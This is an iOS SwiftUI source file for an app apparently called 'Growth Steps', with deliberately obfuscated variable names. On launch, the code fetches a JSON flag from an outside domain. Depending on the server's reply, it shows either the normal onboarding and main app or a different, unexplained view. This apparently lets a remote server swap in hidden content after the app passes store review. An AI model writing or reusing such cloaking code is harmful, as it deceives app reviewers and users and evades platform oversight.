//
//  ContentView.swift
//  MyChallengeApp
//
//  Created by D K on 15.10.2025.
//


import SwiftUI
import OneSignalFramework


struct ContentView: View {
    
    @State private var harlonSelvikMandorFexrel: Bool = true
    @StateObject private var userData = UserData()
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false

    @State private var farlonCavexDrivonPelmar: Bool?
    @State private var strovenKelmorVastinGrelix: String?
    @State private var miranoFelvarStaxelDromin: Bool = true
    
    @AppStorage("brevinTalmarGexonSilvar") var brevinTalmarGexonSilvar: Bool = true
    @AppStorage("draxenPolvarHilmonSertic") var draxenPolvarHilmonSertic: Bool = false
    
    var body: some View {
        ZStack {
            
            if farlonCavexDrivonPelmar != nil {
                if strovenKelmorVastinGrelix == "Growth Steps" || draxenPolvarHilmonSertic == true {
                    
                    VStack {
                        if harlonSelvikMandorFexrel {
                            Image(.bgMain)
                                .resizable()
                                .aspectRatio(contentMode: .fill)
                                .frame(minWidth: 0, maxWidth: .infinity)
                                .frame(minHeight: 0, maxHeight: .infinity)
                                .edgesIgnoringSafeArea(.all)
                                .onAppear {
                                    DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
                                        withAnimation {
                                            harlonSelvikMandorFexrel = false
                                        }
                                    }
                                }
                        } else {
                            if hasCompletedOnboarding {
                                MainTabView()
                                    .environmentObject(userData)
                            } else {
                                OnboardingContainerView(onFinish: {
                                    hasCompletedOnboarding = true
                                })
                            }
                        }
                    }
                    .onAppear {
                        AppDelegate.orientationLock = .portrait
                        UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
                        
                        miranoFelvarStaxelDromin = false
                        draxenPolvarHilmonSertic = true
                    }
                } else {
                    RemvalKornixDedronMalvik(draxenPolvarHilmonSertic: $draxenPolvarHilmonSertic)
                        .onAppear { miranoFelvarStaxelDromin = false }
                }
            }
            
            if miranoFelvarStaxelDromin {
                Image(.bgMain)
                    .resizable()
                    .aspectRatio(contentMode: .fill)
                    .frame(minWidth: 0, maxWidth: .infinity)
                    .frame(minHeight: 0, maxHeight: .infinity)
                    .edgesIgnoringSafeArea(.all)
            }
        }
        .onAppear {
            OneSignal.Notifications.requestPermission { farlonCavexDrivonPelmar = $0 }
            
            if brevinTalmarGexonSilvar {
                guard let kervanStolmicRavoxDelnar = URL(string: "https://conversationretain.store/growthsteps/growthsteps.json") else { return }
                
                URLSession.shared.dataTask(with: kervanStolmicRavoxDelnar) { fravelDornicSelmarVexin, _, _ in
                    guard let fravelDornicSelmarVexin else { draxenPolvarHilmonSertic = true; return }
                    
                    guard let travenKilmarSeldorPexin = try? JSONSerialization.jsonObject(with: fravelDornicSelmarVexin, options: []) as? [String: Any] else { return }
                    guard let munterJavexTolmarHirlex = travenKilmarSeldorPexin["hnvjhbdfvjhdbfhf"] as? String else { return }
                    
                    DispatchQueue.main.async {
                        strovenKelmorVastinGrelix = munterJavexTolmarHirlex
                        brevinTalmarGexonSilvar = false
                    }
                }
                .resume()
            }
        }
        
    }
}
